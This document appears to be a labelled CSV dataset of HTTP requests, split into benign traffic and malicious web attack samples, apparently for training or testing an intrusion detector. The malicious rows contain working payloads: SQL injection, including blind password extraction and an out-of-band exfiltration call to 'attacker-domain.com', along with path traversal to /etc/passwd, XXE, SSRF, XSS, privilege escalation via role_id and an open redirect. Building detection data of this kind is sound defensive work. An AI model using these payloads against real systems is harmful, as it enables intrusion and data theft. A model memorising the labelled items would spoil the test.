label,text
benign,"GET /api/v1/video-galleries?category=travel&limit=12 HTTP/1.1
Host: media-streaming-platforms.net
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImVuZ2FnZSIsImV4cCI6MTY4NTQ2NjQwMH0.ZfR5Mb5a2M56Tty8AoLGN_n-K6CzXbHPoSS6kgM-i48
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.129 Safari/537.36
Cache-Control: max-age=0
Connection: keep-alive"
benign,"GET /events/registration HTTP/1.1
Host: meetup-connector.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.5
Cookie: user_prefs_b64=eyJwcmVmZXJyZWRFbWFpbCI6Im5ldHdvcmtpbmdAZ21haWwuY29tIiwidXBkYXRlRGF0ZSI6IjIwMjQtMDQtMTgifQ==
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1"
benign,"PUT /api/data/item123 HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Type: text/plain
Content-Length: 33
Accept-Encoding: deflate, gzip
Connection: keep-alive
X-CSRF-Token: c4f3d2e1b5a79e4d6f8c

Configuration value has been set."
malicious,"GET /user/profile?category=5%27%20UNION%20SELECT%20@@VERSION%2CSLEEP%285%29%2CUSER%28%29--%20 HTTP/1.1
Host: api.finance-hub.net
Connection: keep-alive
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Cookie: session_token=2f9a7b8c5d1574e439d0bdbaa2298aee; secure_mode=1"
benign,"GET /content/%E6%BC%AB%E7%94%BB HTTP/1.1
Host: anime-streaming-cloud.jp
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Connection: keep-alive
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1"
benign,"POST /submit/contact HTTP/1.1
Host: feedback.community.game-dev-forum.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Content-Language: en-US
Origin: https://community.game-dev-forum.org
Referer: https://community.game-dev-forum.org/contact
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Accept-Language: en-US,en;q=0.9
Connection: close

name=Patrick+Hawkins&email=phawkins%40mailservice.org&message=Hello+team!"
benign,"OPTIONS /resources/v2/user/profile HTTP/1.1
Host: api.cloud-data-services.ai
Origin: https://web.sales-portal.biz
Access-Control-Request-Method: GET
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close"
benign,"POST /api/v1/scripts/init.js HTTP/1.1
Host: smart-home-hub.tech
Content-Type: application/javascript
Content-Length: 41
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept: application/javascript
Cache-Control: max-age=0
Connection: keep-alive

console.log('Smart home init script loaded');"
benign,"GET /stream/data/live-updates?channel=sports&event=football&quality=high&format=json&include_comments=true&max_retries=5&client_version=5.2.1&accept_gzip=true&lang=en-US&region=NA&session_id=c09a3c76c2e74989 HTTP/1.1
Host: realtime-streaming-hub.tv
Connection: keep-alive
Accept: application/json
User-Agent: python-requests/2.28.2
X-CSRF-Token: a73b57e9933acae6398c4b6b007e85e5"
benign,"GET /articles/read?id=89 HTTP/1.1
Host: insight-newsroom.ai
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml
Accept-Language: en-GB,en;q=0.5
Cache-Control: max-age=0
Connection: keep-alive"
malicious,"POST /admin/moderate_comment HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 142
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15

comment_ref=123&action_param_b64=cHJvZHVjdF9pZD0xMjM7IERST1AgVEFCTEUgdXNlcnM7IC0t"
malicious,"GET /config/edit?file=../../../../../../../../etc/passwd HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Charset: utf-8, iso-8859-1;q=0.5
Accept-Language: en-US,en;q=0.5
Cache-Control: no-cache
Referer: https://online-retail-store.biz/admin/dashboard
Connection: keep-alive"
benign,"GET /api/v1/weather/current?city=Santorini HTTP/1.1
Host: weather-forecast-service.cloud
Accept: application/json
X-Requested-With: XMLHttpRequest
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.gJvtymUcPCDQYb-
Origin: https://weather-forecast-service.cloud
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
benign,"GET /static/v2/css/theme.css?cmd=view_details HTTP/1.1
Host: digital-creative-hub.dev
Accept: text/css,*/*;q=0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15
Cache-Control: max-age=31536000
Connection: keep-alive"
malicious,"POST /user/update HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Content-Length: 72

displayName=WriterPro&preferences%5Blayout%5D=compact&role_id=1&internal_user_status=ACTIVE"
benign,"GET /help/faqs/general HTTP/1.1
Host: support-center.ai
User-Agent: Mozilla/5.0 (Linux; Android 7.1.2; Moto G (5) Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.94 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: text/html,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Connection: keep-alive
Cache-Control: max-age=0"
malicious,"POST /app/user/settings HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/xml
Content-Length: 210
Referer: https://community.game-dev-forum.org/settings
Connection: keep-alive

<?xml version=""1.0""?>
<!DOCTYPE settings [
<!ENTITY xxe_ssrf SYSTEM ""http://127.0.0.1:9000/internal_api"" >
]>
<settings>
  <note>&xxe_ssrf;</note>
</settings>"
malicious,"POST /api/v1/image/process HTTP/1.1
Host: media-proxy-cloud.net
User-Agent: Python-urllib/3.8
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 97

imageUrl=http%3A%2F%2Fcdn-images.media-proxy-cloud.net%2Fbanner.png&quality=high&imageUrl=http%3A%2F%2F127.0.0.1%2Fadmin%2Fconfig"
benign,"POST /feedback HTTP/1.1
Host: creative-agency-web.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0
Accept: text/plain, */*; q=0.01
Content-Type: application/x-www-form-urlencoded
Content-Length: 140
Connection: keep-alive

username=artlover42&feedback=%3Cfeedback%3EI+appreciate+the+recent+website+updates.%3C%2Ffeedback%3E&rating=5"
malicious,"GET /redirect?target=data:text/html;base64,PHNjcmlwdD5hbGVydCgnUmVkaXJlY3RlZCEgWFNTJyk8L3NjcmlwdD4= HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://community.game-dev-forum.org/forums
Connection: keep-alive"
benign,"POST /form/contact/submit HTTP/1.1
Host: community.healthcare-forum.org
Content-Type: application/json
Accept-Language: en-US,en;q=0.9
Content-Length: 33
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
Referer: https://community.healthcare-forum.org/contact

{""UNION ALL"": ""request information""}"
benign,"GET /static/img/notifications-bell.svg HTTP/1.1
Host: secure-user-portal.net
Accept: image/svg+xml,image/webp,*/*
Referer: https://secure-user-portal.net/app/notifications
DNT: 1
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0"
benign,"POST /files/new-upload HTTP/1.1
Host: online-retail-store.biz
Connection: keep-alive
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Content-Type: multipart/form-data; boundary=----UploadBoundary2024
Content-Length: 2758
Cache-Control: no-cache
Pragma: no-cache

------UploadBoundary2024
Content-Disposition: form-data; name=""order_id""

ORD12345678
------UploadBoundary2024
Content-Disposition: form-data; name=""document""; filename=""warranty_claim.pdf""
Content-Type: application/pdf

%PDF-1.4
%Warranty claim form placeholder content for order.
------UploadBoundary2024--"
benign,"POST /upload/photos/batch HTTP/1.1
Host: media-archive.devops.ai
Connection: close
Content-Type: multipart/form-data; boundary=----MyCustomBoundary8
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Content-Length: 754

------MyCustomBoundary8
Content-Disposition: form-data; name=""files[]""; filename=""mountain_view.jpeg""
Content-Type: image/jpeg

<JPEG FILE DATA - omitted>
------MyCustomBoundary8
Content-Disposition: form-data; name=""files[]""; filename=""skyline.png""
Content-Type: image/png

<PNG FILE DATA - omitted>
------MyCustomBoundary8--"
malicious,"GET /store/cart?productId=%2527%2520OR%2520%2528SELECT%2520LOAD_FILE%2528CONCAT%2528%2527%255C%255C%255C%255C%2527%252C%2528SELECT%2520version%2528%2529%2529%252C%2527.attacker-domain.com%255C%255Cdata%2527%2529%2529%2529--%2520 HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Accept-Encoding: br, gzip
Connection: keep-alive
Cookie: cart_session=2187ee42983141c19d66dd0e1eacf887; user_pref=darkmode
Referer: https://online-retail-store.biz/products/home"
benign,"POST /api/log HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: application/json
Content-Type: application/json
Content-Length: 276
Connection: keep-alive

{""logEntry"":{""page"":""/blog/article/view/4582"",""interaction"":{""type"":""scroll"",""details"":{""percentScrolled"":75,""timeSpentSeconds"":180}},""visitor"":{""geo"":{""country"":""US"",""state"":""CA""},""device"":""mobile""}},""eventTime"":""2024-06-01T16:10:00Z""}"
malicious,"GET /dashboard/home HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 <script>alert('LogViewerXSS')</script> (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close"
malicious,"GET /redirect?target=http%3A%2F%2Fe-commerce.4u.trade%40fakeauth.net%2Fsignin HTTP/1.1
Host: e-commerce.4u.trade
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate
Referer: https://e-commerce.4u.trade/shop/cart
Connection: keep-alive"
benign,"GET /wiki/Resource_(disambiguation) HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us
Referer: https://secure-user-portal.net/home
Cache-Control: max-age=0
Connection: keep-alive"
benign,"POST /api/v1/document/upload HTTP/1.1
Host: docu-exchange-platform.net
Connection: close
User-Agent: curl/7.86.0
Accept: */*
Content-Type: multipart/form-data; boundary=--BoundaryXyz123
Content-Length: 496
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

----BoundaryXyz123
Content-Disposition: form-data; name=""document""; filename=""budget_overview.pdf""
Content-Type: application/pdf

%PDF-1.5
%ÐÔÅØ
1 0 obj
<< /Type /Catalog >>
endobj

----BoundaryXyz123
Content-Disposition: form-data; name=""year""

2024
----BoundaryXyz123
Content-Disposition: form-data; name=""department""

Finance
----BoundaryXyz123--"
benign,"GET /library/search?title=the+complete+works+of+william+shakespeare+with+commentary+and+historical+context+plus+modern+analysis+and+interpretations HTTP/1.1
Host: heritage-literature.org
Accept: text/html
Accept-Language: en-US,en;q=0.9
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1
Connection: keep-alive"
benign,"POST /api/auth/v1/password/request-reset HTTP/1.1
Host: green-energy-solutions.biz
Content-Type: application/json
Accept: application/json
Pragma: no-cache
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Content-Length: 52

{""email"":""sophia.mcleod@green-energy-solutions.biz""}"
benign,"POST /orders/checkout HTTP/1.1
Host: online-retail-store.biz
Authorization: Bearer qwerty12345axcvbn67890
Content-Type: application/json
Accept: */*
Connection: close
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Mobile Safari/537.36
Content-Length: 163

{
  ""cart-items"": [{""product-id"": ""elec_tv_1234"", ""quantity"": 1}, {""product-id"": ""snd_hd_buds"", ""quantity"": 2}],
  ""payment-method"": ""credit_card"",
  ""billing-info"": {
    ""card.number"": ""**** **** **** 1234"",
    ""card.expiry-date"": ""07/26"",
    ""card-holder-name"": ""Jonas M.""
  },
  ""delivery.instructions"": ""Leave at reception desk""
}"
malicious,"POST /v4/task/submit HTTP/1.1
Host: api.streamline-syncing.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
Accept: application/json
X-Callback-Server: http://ssrf-trigger.rebind-domain.dev/run
Content-Type: application/json
Content-Length: 44

{""task"":""aggregation"",""priority"":""high""}"
malicious,"POST /app/settings/update HTTP/1.1
Host: financial-analytics-suite.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.7
Content-Type: application/json
Cookie: layout=../../../../etc/group%00config; sid=3e7d4c9b1a2f
Content-Length: 48

{""notifications"":true,""theme"":""dark"",""lang"":""en-US""}"
benign,"GET /forums/thread/view?topic=Discussion%20on%20best%20practices%20for%20open-source%20project%20documentation%20including%20README%20guidelines%2C%20changelogs%2C%20and%20code%20commenting%20standards%20among%20beginner%20contributors HTTP/1.1
Host: community.code-crafters.org
User-Agent: python-requests/2.28.2
Accept: application/json
Connection: keep-alive"
benign,"POST /account/profile HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 108
Origin: https://online-retail-store.biz
Referer: https://online-retail-store.biz/account/profile
Cookie: token=a9d14f7db01a6bcc1ae738c736a4ddfa; Path=/; HttpOnly
User-Agent: curl/7.83.1
Accept: */*
Connection: close

display_name=ShopSmart&bio=Dedicated+shopper+and+reviewer.&website_url=https%3A%2F%2Fshopsmartreviews.biz&location=Denver%2C+Colorado"
benign,"GET /women/accessories/scarves HTTP/1.1
Host: timeless-style-outlet.info
Connection: keep-alive
Accept: text/html
Accept-Language: en-US,en;q=0.8
Referer: https://timeless-style-outlet.info/women/accessories
Cookie: sessid=dc3412af78b9d5a2f718e462fb01c36e; cartno=ab763d984ef1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.104 Safari/537.36"
malicious,"PUT /api/v3/items/search HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
Content-Length: 305
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36
Origin: https://online-retail-store.biz
X-Requested-With: FetchAPIClient
Accept: application/json, text/plain
Accept-Encoding: gzip, deflate

{""query"": ""wireless earbuds"", ""filters"": {""priceRange"": {""min"": 25, ""max"": 150}, ""availability"": ""in_stock""}, ""<img src=x onerror=\""eval(String.fromCharCode(0x61,108,0145,114,0x74,40,0x27,88,0x53,0123,45,0x4b,101,0x79,0x27,41))\"">"": ""searchFlag"", ""sortBy"": ""relevance""}"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
Content-Length: 96
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
X-CSRF-Token: a045d2e1f98b4b13b21d56a653afe0d4

{""query"": ""smartphone' AnD (SeLeCt NULL FROm dual_table WHERE 1=1) -- -"", ""category"": ""electronics""}"
benign,"GET /flavors/ice-cream/vanilla.avif HTTP/1.1
Host: sweet-treats-parlor.net
Accept: image/avif,image/webp,*/*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Accept-Language: en-US
Referer: https://sweet-treats-parlor.net/menu/ice-cream
Connection: keep-alive
Cache-Control: no-cache"
malicious,"GET /products/view?item=12345 HTTP/1.1
Host: urban-gadget-hub.ai
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Cookie: session=1f4b3c5d7e8a9b0d; tracking_id=jkl37' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=0x61, SLEEP(5),0) #
Cache-Control: max-age=0"
benign,"PATCH /api/v1/settings HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept: application/json
Content-Type: application/json-patch+json
Content-Length: 60
Cookie: auth_token=eyjxQ2xlYW4yMjQ5ODEyMw==
Upgrade-Insecure-Requests: 1

[
  { ""op"": ""replace"", ""path"": ""/privacy/activityStatus"", ""value"": ""friends"" }
]"
benign,"POST /app/notes/add HTTP/1.1
Host: enterprise-analytics.pro
User-Agent: curl/7.81.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 88
Accept: */*
X-Requested-With: XMLHttpRequest
Connection: keep-alive

note=Remember+to+review+how+DELETE+statements+affect+dependent+tables+in+the+production+environment."
benign,"GET /catalog/search?query=wireless+headphones&callback=processData&sort=popularity HTTP/1.1
Host: shopzone-marketplace.biz
Accept: application/javascript
Accept-Language: en-US,en;q=0.8
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Cache-Control: max-age=0"
